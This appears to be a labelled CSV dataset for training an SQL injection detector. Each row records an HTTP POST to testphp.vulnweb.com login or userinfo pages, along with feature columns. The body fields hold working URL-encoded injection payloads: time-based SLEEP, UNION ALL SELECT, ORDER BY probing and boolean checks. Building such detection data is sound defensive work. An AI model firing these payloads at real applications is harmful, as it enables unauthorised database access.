url,method,body,header,sql_injection_keywords_url,sql_injection_keywords_body,sql_injection_keywords_header,header_entropy,body_entropy,number_of_special_chars,count_query_params,body_special_chars,query_param_length,path_depth,sql_injection
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20AND%20%28SELECT%209883%20FROM%20%28SELECT%28SLEEP%285%29%29%29ydon%29--%20ldrU&pass=fsdfsdf,"{""Content-Length"": ""109"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,16,98,5.264347165186421,4.571077454656828,154,0,20,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds%27%20AND%20%28SELECT%209883%20FROM%20%28SELECT%28SLEEP%285%29%29%29ydon%29--%20ldrU&pass=fsdfsdf,"{""Content-Length"": ""109"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,16,98,5.264347165186421,4.571077454656828,154,0,20,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20AND%20%28SELECT%209883%20FROM%20%28SELECT%28SLEEP%280%29%29%29ydon%29--%20ldrU&pass=fsdfsdf,"{""Content-Length"": ""109"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,16,98,5.264347165186421,4.533080120252458,154,0,20,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds%27%20AND%20%28SELECT%209883%20FROM%20%28SELECT%28SLEEP%280%29%29%29ydon%29--%20ldrU&pass=fsdfsdf,"{""Content-Length"": ""109"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,16,98,5.264347165186421,4.533080120252458,154,0,20,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20AND%20%28SELECT%209883%20FROM%20%28SELECT%28SLEEP%285%29%29%29ydon%29--%20ldrU&pass=fsdfsdf,"{""Content-Length"": ""109"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,16,98,5.264347165186421,4.571077454656828,154,0,20,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds%27%20AND%20%28SELECT%209883%20FROM%20%28SELECT%28SLEEP%285%29%29%29ydon%29--%20ldrU&pass=fsdfsdf,"{""Content-Length"": ""109"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,16,98,5.264347165186421,4.571077454656828,154,0,20,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20ORDER%20BY%201%23&pass=fsdfsdf,"{""Content-Length"": ""48"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.263512006259568,4.145512835516972,154,0,8,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds%27%20ORDER%20BY%201%23&pass=fsdfsdf,"{""Content-Length"": ""48"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.263512006259568,4.145512835516972,154,0,8,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20ORDER%20BY%206104%23&pass=fsdfsdf,"{""Content-Length"": ""51"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.260222532575358,4.25401952966488,154,0,8,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20ORDER%20BY%2010%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.264753597546021,4.138409917020568,154,0,8,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20ORDER%20BY%206%23&pass=fsdfsdf,"{""Content-Length"": ""48"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.263512006259568,4.145512835516972,154,0,8,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds%27%20ORDER%20BY%206%23&pass=fsdfsdf,"{""Content-Length"": ""48"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.263512006259568,4.145512835516972,154,0,8,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20ORDER%20BY%208%23&pass=fsdfsdf,"{""Content-Length"": ""48"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.263512006259568,4.145512835516972,154,0,8,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds%27%20ORDER%20BY%208%23&pass=fsdfsdf,"{""Content-Length"": ""48"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.263512006259568,4.145512835516972,154,0,8,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20ORDER%20BY%209%23&pass=fsdfsdf,"{""Content-Length"": ""48"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.263512006259568,4.145512835516972,154,0,8,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20UNION%20ALL%20SELECT%20CONCAT%280x7170766a71%2C0x586441417443517a59714642456953416e70716b706a465a596763574f49546a556468534e4e6678%2C0x716a6b7671%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&pass=fsdfsdf,"{""Content-Length"": ""230"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,17,98,5.26763123743601,4.554531185688824,154,0,20,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%27%20UNION%20ALL%20SELECT%20CONCAT%280x7170766a71%2C0x586441417443517a59714642456953416e70716b706a465a596763574f49546a556468534e4e6678%2C0x716a6b7671%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20UNION%20ALL%20SELECT%20CONCAT%280x7170766a71%2C0x436c71446b5961766c68596377617650784a77495747474979576f6843484d65425552494a657141%2C0x716a6b7671%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&pass=fsdfsdf,"{""Content-Length"": ""429"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,32,98,5.273665017470012,4.467199220109289,154,0,35,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds&pass=fsdfsdf.%2C.%2C%29%2C%27%28.%22,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.264753597546021,3.7314307637581896,154,0,13,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds&pass=fsdfsdf%27qEdkYh%3C%27%22%3EIjhEeX,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.266637227525836,4.256332334875691,154,0,8,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds&pass=fsdfsdf%27%29%20AND%206112%3D7726%20AND%20%28%27APij%27%3D%27APij,"{""Content-Length"": ""83"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,12,98,5.261628376279755,4.222409425318028,154,0,15,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds&pass=fsdfsdf%27%29%20AND%206865%3D6865%20AND%20%28%27ijhW%27%3D%27ijhW,"{""Content-Length"": ""83"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,12,98,5.261628376279755,4.349579986305302,154,0,15,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds&pass=fsdfsdf%27%20AND%209429%3D7038%20AND%20%27yxYK%27%3D%27yxYK,"{""Content-Length"": ""77"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,10,98,5.262705715148265,4.307797061582495,154,0,13,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds&pass=fsdfsdf%27%20AND%209429%3D7038%20AND%20%27yxYK%27%3D%27yxYK,"{""Content-Length"": ""77"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,10,98,5.262705715148265,4.307797061582495,154,0,13,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds&pass=fsdfsdf%27%20AND%206865%3D6865%20AND%20%27ZobS%27%3D%27ZobS,"{""Content-Length"": ""77"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,10,98,5.262705715148265,4.366283989686624,154,0,13,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds&pass=fsdfsdf%27%20AND%206865%3D6865%20AND%20%27ZobS%27%3D%27ZobS,"{""Content-Length"": ""77"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,10,98,5.262705715148265,4.366283989686624,154,0,13,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds&pass=fsdfsdf%29%20AND%203820%3D4660%20AND%20%288617%3D8617,"{""Content-Length"": ""71"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,8,98,5.261628376279755,4.2478377893686625,154,0,11,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds&pass=fsdfsdf%29%20AND%203820%3D4660%20AND%20%288617%3D8617,"{""Content-Length"": ""71"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,8,98,5.261628376279755,4.2478377893686625,154,0,11,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds&pass=fsdfsdf%29%20AND%206865%3D6865%20AND%20%282749%3D2749,"{""Content-Length"": ""71"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,8,98,5.261628376279755,4.281730352137208,154,0,11,0,1,True
